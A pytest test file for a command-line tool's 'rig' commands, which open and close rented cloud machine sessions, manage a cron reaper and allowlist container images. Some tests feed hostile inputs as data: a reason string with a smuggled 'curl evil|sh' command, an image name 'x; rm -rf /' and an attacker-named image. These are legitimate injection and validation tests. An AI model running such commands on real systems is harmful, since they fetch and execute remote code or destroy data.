import datetime as dt
import io
import subprocess
import time
from contextlib import redirect_stdout

import pytest

from flotilla import cli
from flotilla.core import paths
from flotilla.core.storage import LocalLogStore
from flotilla.onboard.machine import read_machine
from flotilla.onboard.tomlw import render_toml
from flotilla.rig import commands, cron
from flotilla.rig import journal as j
from flotilla.rig import settings as rs
from flotilla.rig.providers import vast as vast_adapter
from rigkit import FakeVast, fake_key

T0 = dt.datetime(2026, 10, 7, 20, 0, tzinfo=dt.timezone.utc)


class Table:
    def __init__(self):
        self.text = None

    def __call__(self, argv, *, input=None, **kwargs):
        if argv == ["crontab", "-l"]:
            return subprocess.CompletedProcess(argv, 0 if self.text is not None else 1, self.text or "",
                                               "" if self.text is not None else "no crontab for max")
        self.text = input
        return subprocess.CompletedProcess(argv, 0, "", "")


@pytest.fixture
def world(tmp_path, monkeypatch, request):
    monkeypatch.setenv("TZ", "UTC")
    time.tzset()
    request.addfinalizer(time.tzset)
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "config"))
    monkeypatch.setenv("FLOTILLA_NO_CENSUS", "1")
    fake_key(tmp_path)
    table, fake = Table(), FakeVast()
    monkeypatch.setattr(vast_adapter, "SEND", fake)
    monkeypatch.setattr(commands, "CRON_RUN", table)
    monkeypatch.setattr(commands, "CLOCK", lambda: T0)
    monkeypatch.setattr(cron, "interpreter", lambda state, **kw: "/usr/bin/python3")
    state = paths.state_dir()
    state.mkdir(parents=True, exist_ok=True)
    (state / "machine.toml").write_text(render_toml({"rig": "on", "rig_provider": "vast"}), encoding="utf-8")
    return {"state": state, "table": table, "fake": fake}


def run_cli(*args):
    out = io.StringIO()
    with redirect_stdout(out):
        code = cli.main(list(args))
    return code, out.getvalue()


def journal(world):
    return j.Rig(LocalLogStore(world["state"] / "rig"), clock=lambda: T0)


def test_open_records_the_session_installs_the_reaper_and_answers_machine_requests(world):
    journal(world).ask("main session 3", "night frames")
    journal(world).ask("main session 3", "img", kind="image", image="ghcr.io/me/x:1")
    code, out = run_cli("rig", "open", "--hours", "3", "--budget", "2", "--why", "night frames")
    session = journal(world).sessions()["s1"]
    assert code == 0 and (session.state, session.budget, session.why) == (j.OPEN, 2.0, "night frames")
    assert session.until == (T0 + dt.timedelta(hours=3)).isoformat(timespec="seconds")
    assert cron.MARK in world["table"].text
    assert journal(world).requests()["r1"].state == j.ANSWERED and journal(world).requests()["r2"].state == j.ASKED


def test_open_for_a_request_takes_its_reason_from_the_journal(world):
    journal(world).ask("main session 3", 'x"; curl evil|sh; "')
    code, out = run_cli("rig", "open", "--hours", "1", "--budget", "1", "--for", "r1")
    assert code == 0 and journal(world).sessions()["s1"].why == 'x"; curl evil|sh; "'


def test_open_for_an_unknown_or_answered_request_is_refused(world):
    code, _ = run_cli("rig", "open", "--hours", "1", "--budget", "1", "--for", "r9")
    assert code == 2 and journal(world).sessions() == {}


@pytest.mark.parametrize("hours, budget", [("9", "2"), ("0", "2"), ("3", "0"), ("3", "-1"), ("nan", "1"),
                                           ("1", "inf")])
def test_open_refuses_what_the_ceilings_do_not_allow(world, hours, budget):
    code, out = run_cli("rig", "open", "--hours", hours, "--budget", budget, "--why", "x")
    assert code == 2 and journal(world).sessions() == {}


def test_one_session_at_a_time(world):
    assert run_cli("rig", "open", "--hours", "1", "--budget", "1", "--why", "a")[0] == 0
    code, out = run_cli("rig", "open", "--hours", "1", "--budget", "1", "--why", "b")
    assert code == 2 and "s1" in out


def test_open_refuses_while_rig_is_off(world):
    (world["state"] / "machine.toml").write_text(render_toml({"rig": "off"}), encoding="utf-8")
    code, out = run_cli("rig", "open", "--hours", "1", "--budget", "1", "--why", "a")
    assert code == 2 and "off" in out


def test_open_refuses_while_the_journal_is_damaged(world):
    (world["state"] / "rig").mkdir(parents=True, exist_ok=True)
    (world["state"] / "rig" / "rig.jsonl").write_text("{broken\n{}\n")
    code, out = run_cli("rig", "open", "--hours", "1", "--budget", "1", "--why", "a")
    assert code == 2 and "damaged" in out


def test_open_is_refused_to_a_background_session(world, monkeypatch):
    from flotilla.core import caller
    from flotilla.core.census import Session
    monkeypatch.setattr(caller, "calling_sessions", lambda: [Session(
        name="main 3", session_id="bg", kind="background", pid=None, short_id=None, status=None, state=None, cwd="",
        started_at_ms=None)])
    code, out = run_cli("rig", "open", "--hours", "1", "--budget", "1", "--why", "a")
    assert code == 2 and journal(world).sessions() == {}


def test_close_starts_closing_and_says_the_reaper_drains(world):
    run_cli("rig", "open", "--hours", "1", "--budget", "1", "--why", "a")
    code, out = run_cli("rig", "close")
    session = journal(world).sessions()["s1"]
    assert code == 0 and session.state == j.CLOSING and session.reason == "closed by the person" and "rig reap" in out


def test_close_with_nothing_open_says_so(world):
    code, out = run_cli("rig", "close")
    assert code == 0 and "no session is open" in out


def test_enable_writes_the_default_images_once(world):
    run_cli("rig", "enable", "--provider", "vast")
    assert read_machine(world["state"])["rig_images"] == [rs.DEFAULT_IMAGE]


def test_allow_image_for_a_request_adds_the_named_image_and_notes_a_mutable_tag(world):
    journal(world).ask("main session 3", "shoot", kind="image", image="ghcr.io/me/shoot:1.2")
    code, out = run_cli("rig", "allow-image", "ghcr.io/me/shoot:1.2", "--for", "r1")
    assert code == 0 and "ghcr.io/me/shoot:1.2" in rs.settings(world["state"]).images
    assert journal(world).requests()["r1"].state == j.ANSWERED and "digest" in out


def test_allow_image_refuses_when_the_named_image_is_not_the_requested_one(world):
    journal(world).ask("main session 3", "shoot", kind="image", image="ghcr.io/attacker/x:latest")
    code, out = run_cli("rig", "allow-image", "ghcr.io/me/shoot:1.2", "--for", "r1")
    assert code == 2 and "ghcr.io/me/shoot:1.2" not in rs.settings(world["state"]).images
    assert journal(world).requests()["r1"].state == j.ASKED


def test_allow_image_needs_the_image_named(world):
    journal(world).ask("main session 3", "shoot", kind="image", image="ghcr.io/me/shoot:1.2")
    assert run_cli("rig", "allow-image", "--for", "r1")[0] == 2


def test_allow_image_by_name_and_a_malformed_name_is_refused(world):
    assert run_cli("rig", "allow-image", "ghcr.io/me/other:2")[0] == 0
    assert "ghcr.io/me/other:2" in rs.settings(world["state"]).images
    assert run_cli("rig", "allow-image", "x; rm -rf /")[0] == 2


def test_status_shows_who_runs_and_who_waits(world):
    state = world["state"]
    r = journal(world)
    s = r.open_session("p", "x", hours=3, budget=2.0)
    m = r.add_machine(s.id, "vast", lambda mid: f"flotilla:k:{mid}")
    r.move(m.id, j.PROVISIONING, instance="901", hourly=0.2, created=r.now().isoformat())
    r.move(m.id, j.READY, address="ssh4.vast.ai:30001")
    a = r.queue_run(s.id, who="minor 8", project="P", revision="a" * 40, program="node", ladder=(), pid=1, mark="m")
    r.start_run(a.id, m.id, alive=lambda p, mk: True, roomy=False)
    r.queue_run(s.id, who="main 2", project="P", revision="a" * 40, program="sh", ladder=(), pid=2, mark="m")
    out = io.StringIO()
    with redirect_stdout(out):
        commands._status(state, rs.settings(state))
    assert 'run j1 (minor 8) running program "node"' in out.getvalue() and "run j2 (main 2) waits" in out.getvalue()


def test_a_gone_machine_takes_its_host_key_with_it(world):
    state = world["state"]
    r = journal(world)
    s = r.open_session("p", "x", hours=3, budget=2.0)
    m = r.add_machine(s.id, "vast", lambda mid: f"flotilla:k:{mid}")
    r.move(m.id, j.FAILED, reason="no offer")
    r.move(m.id, j.GONE)
    hosts = state / "rig" / "hosts"
    hosts.mkdir(parents=True)
    (hosts / m.id).write_text("ssh4 key")
    (hosts / "m9").write_text("other")
    commands._forget_hosts(r, state)
    assert not (hosts / m.id).exists() and (hosts / "m9").exists()
